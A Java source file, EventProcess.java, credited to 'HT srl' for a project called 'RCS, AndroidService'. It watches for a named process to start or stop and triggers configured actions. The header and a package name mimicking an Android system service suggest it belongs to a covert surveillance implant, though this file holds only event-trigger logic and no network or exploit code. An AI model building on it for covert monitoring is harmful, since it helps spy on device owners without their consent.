/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.ProcessInfo;
import com.android.service.ProcessStatus;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerProcess;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

public class EventProcess extends EventBase implements Observer<ProcessInfo> {
	/** The Constant TAG. */
	private static final String TAG = "EventProcess"; //$NON-NLS-1$

	private int actionOnEnter, actionOnExit;
	private int type;
	private boolean active = false;
	private String starname;

	@Override
	public void begin() {
		ListenerProcess.self().attach(this);
	}

	@Override
	public void end() {
		ListenerProcess.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();
		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();
			type = databuffer.readInt();

			// Estraiamo il nome del processo
			final byte[] procName = new byte[databuffer.readInt()];
			databuffer.read(procName);

			starname = WChar.getString(procName, true);
		} catch (final IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
			}

			return false;
		}

		return true;
	}

	@Override
	public void go() {

	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(ProcessInfo process) {
		final String processName = process.processInfo.processName;

		if (!matchStar(starname.toLowerCase(), processName.toLowerCase())) {
			return 0;
		}

		if (process.status == ProcessStatus.START && active == false) {
			active = true;
			onEnter();
		} else if (process.status == ProcessStatus.STOP && active == true) {
			active = false;
			onExit();
		}

		switch (type) {
			case 0: // Process
			case 1: // Window
			default:
				break;
		}

		return 0;
	}

	static boolean matchStar(String wildcardProcess, String processName) {
		if (processName == null) {
			return (wildcardProcess == null);
		}

		for (;;) {

			if (wildcardProcess.length() == 0) {
				return (processName.length() == 0);
			}

			if (wildcardProcess.charAt(0) == '*') {
				wildcardProcess = wildcardProcess.substring(1);
				
				if (wildcardProcess.length() == 0) {
					return true;
				}

				if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != '*') {
					final int len = processName.length();
					
					for (int i = 0; i < len; i++) {
						final char c = processName.charAt(0);
						processName = processName.substring(1);
						final String tp = wildcardProcess.substring(1);
						
						if (c == wildcardProcess.charAt(0) && matchStar(tp, processName)) {
							return true;
						}
					}
					
					return false;
				}

				for (int i = 0; i < processName.length(); i++) {
					final char c = processName.charAt(i);
					processName = processName.substring(1);
					
					if (matchStar(wildcardProcess, processName)) {
						return true;
					}
				}
				return false;
			}

			if (processName.length() == 0) {
				return false;
			}

			if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != processName.charAt(0)) {
				return false;
			}

			processName = processName.substring(1);
			wildcardProcess = wildcardProcess.substring(1);
		}

		// NOTREACHED
	}

	public void onEnter() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onEnter): triggering " + actionOnEnter + " " + starname) ;//$NON-NLS-1$ //$NON-NLS-2$
		}
		
		trigger(actionOnEnter);
	}

	public void onExit() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onExit): triggering " + actionOnExit + " " + starname) ;//$NON-NLS-1$ //$NON-NLS-2$
		}
		
		trigger(actionOnExit);
	}
}
